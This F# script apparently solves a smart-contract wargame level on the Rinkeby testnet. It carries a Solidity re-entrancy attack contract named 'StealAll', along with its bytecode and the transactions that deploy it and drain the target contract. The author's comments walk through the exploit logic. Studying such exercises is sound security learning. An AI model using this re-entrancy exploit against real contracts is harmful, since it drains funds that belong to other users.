#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.6.1" 

open web3.fs

// Values and partial applications
let digest = newKeccakDigest
let con = createWeb3Connection "http://127.0.0.1:1248" "2.0"
let constants = createDefaultConstants "0x2268b96e204379ee8366505c344ebe5cc34d3a46"
let mon = createReceiptMonitor con

let call = makeEthCall con constants
let txn = makeEthTxn con constants

// So this level is about re-entrancy. I think I know how this will work.
// The target contract has a withdraw function:
(*
    function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
*)
// I'm guessing that I deploy a contract, and use it to call `withdraw()`. This contract will then attempt to send (via `call`) the 
// sender (my contract) the balance of my contract. Which means first my contract will have to use the `donate()` function.
//
// So my contract's `receive()` will need to be set up to call `withdraw()` automatically, and continue to do so until the contract
// is drained. Getting this logic correct will be the hard part, I think.

// ---

// Here's my implementation, which only needed a _little_ bit of help to get over the finish line (I couldn't figure out how to 
// drain the target completely, only steal more than I sent in). It's longish because I'm not importing but rather making calls, and
// I'm withdrawing the spoils at the end.
(*
    contract StealAll {

    address payable target;
    address payable owner;

    constructor(address payable _target) public payable {
        owner = msg.sender;
        target = _target;
    }
    
    // To guard my spoils
    modifier owned() {
        require(msg.sender == owner);
        _;
    }

    function niceDonation(address _me) public {
        target.call{value: 1 wei }(abi.encodeWithSignature("donate(address)", _me));
    }

    function niceWithdraw() public {
        target.call(abi.encodeWithSignature("withdraw(uint256)", 1));
    }

    function normalWithdraw() public {
        target.call(abi.encodeWithSignature("withdraw(uint256)", target.balance));
    }
    
    // Get my loots
    function getTheSpoils() public owned {
        owner.transfer(address(this).balance);
    }

    // Called by the target during fund disbursement
    receive() external payable{
        target.call(abi.encodeWithSignature("withdraw(uint256)", 1));
    }
}
*)

let stealABI = """[{"inputs":[{"internalType":"addresspayable","name":"_target","type":"address"}],"stateMutability":"payable","type":"constructor"},{"inputs":[],"name":"getTheSpoils","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_me","type":"address"}],"name":"niceDonation","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"niceWithdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"normalWithdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}]""" |> ABI
let bytecode = """60806040526040516108873803806108878339818101604052602081101561002657600080fd5b810190808051906020019092919050505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506107bf806100c86000396000f3fe6080604052600436106100435760003560e01c80631a3155b6146101b25780637e0f0fc614610203578063e65dbc761461021a578063f7cc1f7514610231576101ad565b366101ad5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166001604051602401808281526020019150506040516020818303038152906040527f2e1a7d4d000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b60208310610141578051825260208201915060208101905060208303925061011e565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146101a3576040519150601f19603f3d011682016040523d82523d6000602084013e6101a8565b606091505b505050005b600080fd5b3480156101be57600080fd5b50610201600480360360208110156101d557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610248565b005b34801561020f57600080fd5b506102186103c4565b005b34801561022657600080fd5b5061022f610489565b005b34801561023d57600080fd5b506102466105ee565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16600182604051602401808273ffffffffffffffffffffffffffffffffffffffff1681526020019150506040516020818303038152906040527e362a95000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106103575780518252602082019150602081019050602083039250610334565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d80600081146103b9576040519150601f19603f3d011682016040523d82523d6000602084013e6103be565b606091505b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461041e57600080fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610486573d6000803e3d6000fd5b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166001604051602401808281526020019150506040516020818303038152906040527f2e1a7d4d000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b60208310610582578051825260208201915060208101905060208303925061055f565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146105e4576040519150601f19603f3d011682016040523d82523d6000602084013e6105e9565b606091505b505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631604051602401808281526020019150506040516020818303038152906040527f2e1a7d4d000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b6020831061071d57805182526020820191506020810190506020830392506106fa565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d806000811461077f576040519150601f19603f3d011682016040523d82523d6000602084013e610784565b606091505b50505056fea2646970667358221220805d2eea3b28074eff183f4966a54aba4fe9cff4b8965e2c3343ea20d712307164736f6c634300060c0033""" |> RawContractBytecode

prepareUndeployedContract digest bytecode (Some [Address "0x919E2BF52725418F8CF7AC58a5dd1d9298b1A4dC"]) RINKEBY stealABI
|> Result.bind (deployEthContract con constants "1")
|> logWeb3Error
|> monitorTransaction mon

let attack = 
    loadDeployedContract digest "0x9052492f516f5e6d568492ed6c0bbb41a29b9e59" RINKEBY stealABI 
    |> bindDeployedContract
    |> List.head

makeEthRPCCall con EthMethod.GetStorageAt ["0x9052492f516f5e6d568492ed6c0bbb41a29b9e59"; "0x1"; LATEST]

makeEthTxn con constants attack (ByString "niceDonation") [Address "0x9052492f516f5e6d568492ed6c0bbb41a29b9e59"] ZEROV
|> logWeb3Error
|> monitorTransaction mon

makeEthTxn con constants attack (ByString "niceWithdraw") [] ZEROV
|> logWeb3Error
|> monitorTransaction mon

makeEthTxn con constants attack (ByString "normalWithdraw") [] ZEROV
|> logWeb3Error
|> monitorTransaction mon

makeEthTxn con constants attack (ByString "getTheSpoils") [] ZEROV
|> logWeb3Error
|> monitorTransaction mon
